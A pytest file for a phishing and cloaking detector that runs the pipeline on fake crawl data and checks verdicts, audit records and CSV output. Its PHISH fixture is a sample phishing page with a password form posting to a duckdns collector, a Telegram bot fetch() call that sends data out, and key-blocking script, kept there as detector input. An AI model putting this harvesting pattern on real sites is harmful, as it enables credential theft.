"""真的跑 graph.py 的 compiled LangGraph（不連網、不呼叫真模型）。

測的是「圖的接線」與跨模組的契約，不是手動照抄呼叫順序：觀察由 support.fake_observer
注入（替換 nodes.node1_scraper.observe_url），其餘全部是真實程式路徑。
"""
import csv
import hashlib
import json
from pathlib import Path

import pytest

import cli
import graph
import main
import nodes.node1_scraper as n1
import nodes.node5_output as output
from crawler.plan import ObservationSettings, effective_order
from feeds.phishunt import snapshot
from feeds.snapshot import select_active_batch
from llm.contract import model_observation
from reporting import audit
from reporting.pairs import pair_meta
from reporting.rows import BATCH_FIELDS, SUMMARY_FIELDS, result_row
from support import CLEAN as SUPPORT_CLEAN
from support import browser, fake_observer, pair, record

CLEAN = "<html><body><h1>Under maintenance</h1><p>Please check back later.</p></body></html>"
PHISH = """
<html><body oncontextmenu="return false;">
<form action="https://collector-9x.duckdns.org/next.php" method="post">
  <input type="text" name="email"><input type="password" name="password">
</form>
<script>
document.getElementById('password').value;
document.querySelector('[type="password"]');
fetch('https://api.telegram.org/bot123456789:AAFvE7xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=1');
document.onkeydown = function(e){ if(e.keyCode === 123) return false; };
</script></body></html>
"""
CLOAKED_URL = "https://secure-login.duckdns.org/verify"


def _run(monkeypatch, url, bot_html, human_html, source=None, **pair_kw):
    bot, human = pair(record(bot_html, url=url), browser(human_html, url=url), **pair_kw)
    monkeypatch.setattr(n1, "observe_url", fake_observer(bot, human))
    state = graph.build_graph().invoke(graph.create_initial_state(url, source))
    with open(output.SESSION_CSV, encoding="utf-8-sig") as handle:
        rows = list(csv.DictReader(handle))
    assert rows and list(rows[0]) == output.FIELDNAMES
    return state


def test_cloaked_site_end_to_end(monkeypatch):
    s = _run(monkeypatch, CLOAKED_URL, CLEAN, PHISH)
    assert s["cloaking_label"] == "true" and s["cloaking_verified"]
    assert s["cloaking_confidence_tier"] == "CONFIRMED"
    assert "webhook_exfiltration" in s["dual_crawl_results"]["hidden_from_bot"]
    # 判定用頁面是瀏覽器那份（JS 執行後的 DOM）
    assert "api.telegram.org" in s["raw_html"] and s["analysis_source"] == "human#1:dom"


def test_identical_sides_end_to_end(monkeypatch):
    s = _run(monkeypatch, "https://shop.example.com/", CLEAN, CLEAN)
    assert s["cloaking_label"] == "false" and not s["cloaking_verified"]
    assert "是否有 Cloaking：本次設定未觀察到" in s["report"]


def test_invalid_url_stops_before_observation(monkeypatch):
    s = _run(monkeypatch, "file:///untrusted", CLEAN, PHISH)
    assert s["alive"] is False and not s["bot_crawl"]
    assert s["phishing_verdict"] == s["cloaking_label"] == "unknown"
    assert "是否有 Cloaking：無法判定" in s["report"] and s["evidence"]


def test_deobfuscation_always_runs_before_cloaking(monkeypatch):
    """Node 2 不可跳過 —— Node 4 的靜態層比對可讀原始碼，拿到空 JS 會靜默失效。"""
    s = _run(monkeypatch, CLOAKED_URL, CLEAN, PHISH)
    assert s["deobfuscated_js"], "Node 2 被跳過了"
    assert s["dual_crawl_results"], "沒進 Node 4"


def test_phishing_and_cloaking_are_independent(monkeypatch):
    """兩端拿到同一份釣魚頁：沒有差別遞送（cloaking=false），但頁面本身是釣魚頁。"""
    s = _run(monkeypatch, "https://collector-9x.duckdns.org/next", PHISH, PHISH)
    assert s["cloaking_label"] == "false", s["cloaking_reason"]
    assert s["is_phishing"] and s["phishing_verdict"] == "phishing"
    assert "釣魚判定：phishing" in s["report"]


def test_no_content_path_skips_node3(monkeypatch):
    """抓不到內容 → 直接進 Node 5，釣魚欄位保持初始值（unknown，不是 False）。"""
    s = _run(monkeypatch, "https://blank.example/", "", "")
    assert not s["deobfuscated_js"]
    assert s["is_phishing"] is False and s["phishing_confidence"] == 0.0
    assert s["phishing_verdict"] == "unknown" and s["rule_phishing_verdict"] == "not_run"
    assert result_row(s)["is_phishing"] == "N/A"


def test_pair_meta_contains_no_verdict(monkeypatch):
    """盲標的前提：標註者看不到答案。集合差 + 全文掃描鎖住，而不是靠註解提醒。"""
    s = _run(monkeypatch, CLOAKED_URL, CLEAN, PHISH,
             )
    s["source_record"] = {"label": "phishing", "source_label": "phishunt_suspicious"}
    meta = pair_meta(s)
    assert set(meta) == {"url", "bot_status", "human_status", "fetch_time", "crawl_order", "pair_mode"}
    forbidden_keys = {"cloaking", "cloaking_fired", "cloaking_verified", "cloaking_label", "hidden_from_bot",
                      "reverse_diff", "dynamic_reliability", "human_high_spec", "human_mechanisms",
                      "is_phishing", "phishing_verdict", "source_label",
                      # label 不是系統的判定，是來源清單標籤 —— 但它是先驗，κ 與 precision 會虛高
                      "label"}
    assert not (set(meta) & forbidden_keys)
    blob = json.dumps(meta, ensure_ascii=False).lower()
    for word in ("cloak", "phishing", "phishunt", "benign", "fired", "reliability", "verified", "mechanism"):
        assert word not in blob, f"meta.json 洩漏了判定結果：{word}"
    assert main._pair_meta(s) == meta


def test_label_is_list_provenance_not_a_verdict(monkeypatch):
    """label 欄的三條契約，全部是「安靜壞掉」型的錯誤：
    ① 沒有來源快照時留空；② 有標籤時成功列與失敗列都要帶；③ 兩種列的欄位集合完全相同。"""
    s = _run(monkeypatch, CLOAKED_URL, CLEAN, PHISH)
    assert result_row(s)["label"] == ""
    source = {"url": CLOAKED_URL, "label": "phishing", "source_label": "phishunt_suspicious", "batch_id": "fixture"}
    run = cli.Run(ObservationSettings())
    run.source_records = {CLOAKED_URL: source}
    s["source_record"] = source
    ok, bad = result_row(s), cli.failure_row(run, CLOAKED_URL, "fixture_failure")
    assert ok["label"] == bad["label"] == "phishing"
    assert ok["source_label"] == bad["source_label"] == "phishunt_suspicious"
    assert set(ok) == set(bad), set(ok) ^ set(bad)
    assert bad["phishing_verdict"] == bad["cloaking_label"] == "unknown" and bad["is_phishing"] == "N/A"
    assert main._empty_result(CLOAKED_URL, "fixture", run=run)["batch_id"] == "fixture"


def test_graph_source_audit_and_failure_columns(monkeypatch):
    source = {"url": "http://127.0.0.1/fixture", "source_label": "phishunt_suspicious", "label": "phishing",
              "source": "fixture_feed", "batch_id": "batch1", "fetched_at": "2026-10-05T00:00:00+00:00"}
    s = _run(monkeypatch, source["url"], SUPPORT_CLEAN, PHISH, source=source)
    row = result_row(s)
    assert row["phishing_verdict"] == "phishing" and row["cloaking_label"] == "true"
    assert row["rule_cloaking_label"] == "true" and row["llm_cloaking_assessment"] == "unavailable"
    saved = json.loads(Path(s["evidence"]["audit_path"]).read_text(encoding="utf-8"))
    assert saved["source_record"] == source
    assert saved["crawl_records"]["human"]["confirmation"]
    assert "html" not in saved["crawl_records"]["human"], "大型內容只以證據檔＋雜湊引用"
    assert saved["signals"] and saved["final"]["cloaking_label"] == "true"
    assert saved["rule_sha256"] == hashlib.sha256(audit.PHI_PATH.read_bytes()).hexdigest()
    assert json.loads(row["evidence_sources"])["cloaking"] == ["bot#1", "bot#2", "human#1", "human#2"]
    invalid = graph.build_graph().invoke(graph.create_initial_state("file:///never-open"))
    assert invalid["phishing_verdict"] == "unknown" and invalid["evidence"]["audit_path"]
    reasons = json.loads(result_row(invalid)["uncertainty_reasons"])
    assert reasons["phishing"] and reasons["cloaking"], "unknown 必須附原因"


def test_browser_launch_failure_is_unobserved(monkeypatch):
    url = "http://127.0.0.1/fixture"
    bot = record("", url=url, status=0, error="browser_executable_missing")
    human = browser("", url=url, status=0, error="browser_executable_missing")
    bot, human = pair(bot, human)
    monkeypatch.setattr(n1, "observe_url", fake_observer(bot, human, errors=["x"]))
    state = graph.build_graph().invoke(graph.create_initial_state(url))
    row = result_row(state)
    assert state["alive"] is None
    assert row["phishing_verdict"] == row["cloaking_label"] == "unknown"
    assert row["bot_error"] == row["human_error"] == "browser_executable_missing"
    assert row["bot_status_code"] == row["human_status_code"] == 0
    assert "網站是否存活：無法判定" in state["report"]


def test_unicode_js_evidence_does_not_abort_pipeline(monkeypatch):
    html = (SUPPORT_CLEAN.replace("</body>", r'<script>const face="😀"; const lone="\uD800";</script></body>'))
    s = _run(monkeypatch, "https://docs.example.org/fixture", html, html)
    code = s["deobfuscated_js"][0]["deobfuscated"]
    code.encode("utf-8")
    assert "\U0001f600" in code and r"\uD800".lower() in code.lower()
    assert s["phishing_verdict"] == "not_detected" and s["cloaking_label"] == "false", s["cloaking_reason"]
    assert Path(s["evidence"]["audit_path"]).exists()


def test_unpaired_model_text_is_preserved_in_audit():
    state = graph.create_initial_state("http://127.0.0.1/fixture")
    state["model_outputs"] = [model_observation(None, "code", chr(0xD800))]
    audit.finalize_audit(state)
    saved = json.loads(Path(state["evidence"]["audit_path"]).read_text(encoding="utf-8"))
    assert saved["model_outputs"][0]["prompt"] == chr(0xD800)
    assert saved["text_hash_encoding"] == "utf-8/surrogatepass"


def test_crawl_order_split_is_stable_and_balanced():
    """順序切分必須跨 process 可重現（SHA-1，不是加鹽的內建 hash()），且大致均分。"""
    u = CLOAKED_URL
    expected = "human_first" if hashlib.sha1(u.encode()).digest()[0] & 1 else "bot_first"
    assert effective_order(u) == effective_order(u) == expected
    orders = [effective_order(f"https://x{i}.example/") for i in range(500)]
    assert 200 < orders.count("human_first") < 300
    for forced in ("bot_first", "human_first"):
        assert effective_order(u, forced) == forced


def test_csv_columns_keep_legacy_prefix_and_v3_fields():
    assert SUMMARY_FIELDS[:4] == ["url", "alive", "is_phishing", "cloaking"]
    assert output.FIELDNAMES == SUMMARY_FIELDS
    v3 = {"source_label", "phishing_verdict", "rule_phishing_verdict", "llm_phishing_assessment",
          "cloaking_label", "rule_cloaking_label", "llm_cloaking_assessment", "phishing_basis",
          "cloaking_basis", "uncertainty_reasons", "evidence_sources", "evidence", "observation_plan",
          "run_config_sha256", "llm_model", "prompt_version", "cloaking_signals"}
    assert v3 <= set(SUMMARY_FIELDS) and v3 <= set(BATCH_FIELDS)
    assert BATCH_FIELDS[:5] == ["url", "label", "alive", "is_phishing", "cloaking"]


def test_batch_run_writes_manifest_and_identical_columns(monkeypatch, tmp_path):
    batch = snapshot(b"https://fixture.invalid/a\nhttps://fixture.invalid/b\n", tmp_path / "feeds", batch_id="frozen")
    run = cli.Run(ObservationSettings(crawl_order="bot_first"))
    urls = run.select_batch(batch)
    bot, human = pair(record(SUPPORT_CLEAN), browser(SUPPORT_CLEAN))
    monkeypatch.setattr(n1, "observe_url", fake_observer(bot, human))
    monkeypatch.setattr(cli, "CSV_DIR", tmp_path / "csv")
    monkeypatch.setenv("EGRESS_LABEL", "hotspot-mobile")
    import reporting.manifest as manifest_mod
    monkeypatch.setattr(manifest_mod, "wifi_ssids", lambda: ["fixture-ssid"])   # 不依賴跑測試那台機器的網卡
    calls = {"n": 0}
    original = graph.get_graph

    def flaky():   # 第二個 URL 讓管線拋例外：失敗列也要同欄位、同來源
        app = original()

        class Wrapper:
            def invoke(self, state):
                calls["n"] += 1
                if state["url"].endswith("/b"):
                    raise RuntimeError("fixture explosion")
                return app.invoke(state)
        return Wrapper()
    monkeypatch.setattr(graph, "get_graph", flaky)
    rows = cli.analyze_batch(urls, run, output_dir=tmp_path / "results")
    assert [r["batch_id"] for r in rows] == ["frozen", "frozen"]
    assert set(rows[0]) == set(rows[1]) and rows[1]["phishing_verdict"] == "unknown"
    manifest = json.loads(next((tmp_path / "csv").glob("run_*.json")).read_text(encoding="utf-8"))
    assert manifest["source_batch"]["batch_id"] == "frozen" and manifest["schema_version"] == "3.0"
    assert manifest["code_sha256"][str(Path("analysis") / "page_mechanisms.py")]
    assert manifest["profiles"]["bot"]["egress_policy"] == "shared_direct_no_proxy"
    assert manifest["run_config_sha256"] == rows[0]["run_config_sha256"]
    assert manifest["egress"]["label"] == "hotspot-mobile" and manifest["egress"]["wifi_ssid"] == ["fixture-ssid"]
    # 出口標籤是批間的紀錄，不是觀察設定：不得進 run_config_sha256（否則同設定的舊批對不上）
    assert rows[0]["run_config_sha256"] == ObservationSettings(crawl_order="bot_first").config_sha256()
    written = list(csv.DictReader(open(next((tmp_path / "csv").glob("batch_results_*.csv")), encoding="utf-8-sig")))
    assert list(written[0]) == BATCH_FIELDS and len(written) == 2
    with pytest.raises(FileExistsError):
        from reporting.manifest import write_manifest
        stamp = next((tmp_path / "csv").glob("run_*.json")).name[len("run_"):-len(f"_{run.run_id}.json")]
        write_manifest(run_id=run.run_id, urls=urls, csv_dir=tmp_path / "csv", started_at=stamp,
                       settings=run.settings, batch_manifest={}, n_labels=0)


def test_default_batch_accepts_only_line_ending_changes(tmp_path):
    batch = snapshot(b"https://fixture.invalid/a\nhttps://fixture.invalid/b\n", tmp_path / "feeds")
    urls_file, pointer = tmp_path / "urls.txt", tmp_path / "active_batch.json"
    urls_file.write_bytes((batch / "urls.txt").read_bytes().replace(b"\n", b"\r\n"))
    pointer.write_text(json.dumps({"path": str(batch)}), encoding="utf-8")
    assert select_active_batch(urls_file, pointer) == batch
    urls_file.write_bytes(b"https://fixture.invalid/changed\r\n")
    assert select_active_batch(urls_file, pointer) is None
